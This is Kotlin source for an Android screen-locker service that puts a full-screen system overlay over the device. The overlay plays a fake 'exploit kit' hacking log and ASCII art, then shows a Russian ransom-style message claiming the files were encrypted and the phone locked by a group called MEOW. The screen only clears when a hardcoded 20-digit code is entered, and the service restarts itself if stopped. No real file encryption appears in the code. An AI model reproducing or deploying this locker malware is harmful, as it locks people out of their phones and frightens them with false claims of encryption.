package com.clawd.locker

import android.app.Service
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.widget.EditText
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import java.io.File

class LockOverlayService : Service() {
    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: LinearLayout
    private lateinit var mainText: TextView
    private lateinit var ransomLayout: LinearLayout
    private lateinit var inputLayout: LinearLayout
    
    private val PASSWORD = "12908449519408372641"

    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        
        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
            PixelFormat.TRANSLUCENT
        )
        
        overlayView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.BLACK)
        }
        
        mainText = TextView(this).apply {
            setTextColor(Color.parseColor("#00FF00"))
            textSize = 12f
            typeface = Typeface.MONOSPACE
            gravity = Gravity.CENTER
            text = """
                > exploit kit v6.6.6 ...
                > bypass firewall ... [OK]
                > inject payload ... [OK]
                > root access ... [GRANTED]
                > encrypt /sdcard ... 100%
            """.trimIndent()
        }
        overlayView.addView(mainText)
        
        ransomLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            visibility = View.GONE
            setPadding(20, 20, 20, 20)
            setBackgroundColor(Color.BLACK)
        }

        val logoView = ImageView(this).apply {
            // Ищем картинку в ресурсах. Если ее нет (потому что она в корне), ставим заглушку
            val resId = resources.getIdentifier("meow_logo", "drawable", packageName)
            if (resId != 0) {
                setImageResource(resId)
            } else {
                // Если ее нет в drawable, ставим стандартную иконку, чтобы не крашилось
                setImageResource(android.R.drawable.ic_dialog_alert) 
            }
            val layoutParams = LinearLayout.LayoutParams(350, 350)
            layoutParams.setMargins(0, 0, 30, 0)
            this.layoutParams = layoutParams
            scaleType = ImageView.ScaleType.FIT_CENTER
        }

        val infoView = TextView(this).apply {
            text = """
                Привет юзер!
                
                Ты попался на MeowMint!
                Все ваши файлы были зашифрованы,
                а телефон заблокирован хакерской
                группировкой MEOW!
                
                xdwd
                
                Creator: @ME0W_MINT
                Coder: @ME0W_MINT
                Beta Tester / Helper: @ME0W_MINT
                ------------------------
                Squad: @ME0W_MINT
            """.trimIndent()
            setTextColor(Color.parseColor("#FF00FF"))
            textSize = 11f
            typeface = Typeface.MONOSPACE
        }
        
        ransomLayout.addView(logoView)
        ransomLayout.addView(infoView)
        overlayView.addView(ransomLayout)

        inputLayout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            visibility = View.GONE
            setPadding(40, 40, 40, 40)
            setBackgroundColor(Color.parseColor("#0000AA"))
        }
        
        val hintText = TextView(this).apply {
            text = "Введите код разблокировки:"
            setTextColor(Color.WHITE)
            textSize = 18f
            gravity = Gravity.CENTER
        }
        
        val input = EditText(this).apply {
            hint = "Код"
            inputType = InputType.TYPE_CLASS_NUMBER
        }
        
        val btnUnlock = Button(this).apply {
            text = "ПОДТВЕРДИТЬ"
            setOnClickListener {
                if (input.text.toString() == PASSWORD) {
                    stopSelf()
                } else {
                    input.error = "Неверный код!"
                }
            }
        }
        
        inputLayout.addView(hintText)
        inputLayout.addView(input)
        inputLayout.addView(btnUnlock)

        windowManager.addView(overlayView, params)
        windowManager.addView(inputLayout, params)

        startAnimation()
    }

    private fun startAnimation() {
        val handler = Handler(Looper.getMainLooper())
        
        handler.postDelayed({
            overlayView.setBackgroundColor(Color.BLACK)
            mainText.setTextColor(Color.WHITE)
            mainText.textSize = 16f
            mainText.text = """
                _..---====---.._
                      _.-''     .----.     ''-._
                    .'         /      \         '.
                   <          |   ()   |          >
                    '.         \      /         .'
                      '-._      '----'      _.-'
                          ''--...____...--''
                             ВАС ЗАМЕТИЛИ
            """.trimIndent()
            
            handler.postDelayed({
                overlayView.gravity = Gravity.TOP or Gravity.START 
                mainText.gravity = Gravity.TOP or Gravity.START
                mainText.setTextColor(Color.parseColor("#FF00FF"))
                mainText.textSize = 5f
                
                mainText.text = """
           @   @@                                
         @@ @@ @@@                               
         @    @@  @@@       @@ @@                
        @@@@@@@@@     @@@@@@@@   @@              
        @@@@                    @                
        @@ @@                  @@                
        @@    @@@    @@@@@     @@@               
             @@@@@  @@@  @     @@                
            @  @@@  @@@  @    @@                 
        @@  @  @@@  @@@       @@                 
        @@@@@@@@ @@@@@@  @@@  @    @@@@          
          @@ @@@@  @@@@@@@@   @@  @@@  @@        
             @@@@@@@@@@@@@@   @@@@@@     @@      
             @@   @@@@  @@     @ @@      @@      
              @@   @@@ @@     @@@@@       @@     
              @@       @@    @@ @@        @@     
               @@@ @@  @@@  @@             @@@   
               @  @@   @@@@@               @@@@  
              @@  @@  @@ @@               @@@@@  
            @@@@@ @@   @  @@@             @@@@   
         @@@@  @@ @   @@    @            @@      
         @@    @@ @   @@    @           @@       
        @@@    @@@@   @@   @@                    
        @@ @@@   @@@   @@    @        @@@@       
     @@   @@@@@@@@@@@@@@@@@@@@    @@@@@          
   @@@  @@  @@@@    @@@@@  @@@                   
  @@   @  @ @@      @@      @                    
 @@@@@@ @@@@@       @@      @                    
 @@ @@@@@@@         @@@    @@                    
  @@@@@             @    @@@                     
                   @@ @@ @@                      
                   @@@  @@@                      
                    @@@@@@                       
                """.trimIndent()
                
                handler.postDelayed({
                    mainText.visibility = View.GONE
                    overlayView.gravity = Gravity.CENTER
                    ransomLayout.visibility = View.VISIBLE
                    
                    handler.postDelayed({
                        overlayView.visibility = View.GONE
                        inputLayout.visibility = View.VISIBLE
                    }, 7000)
                    
                }, 4000)
                
            }, 3000)
            
        }, 3000)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        super.onDestroy()
        if (::overlayView.isInitialized) windowManager.removeView(overlayView)
        if (::inputLayout.isInitialized) windowManager.removeView(inputLayout)
    }
} 
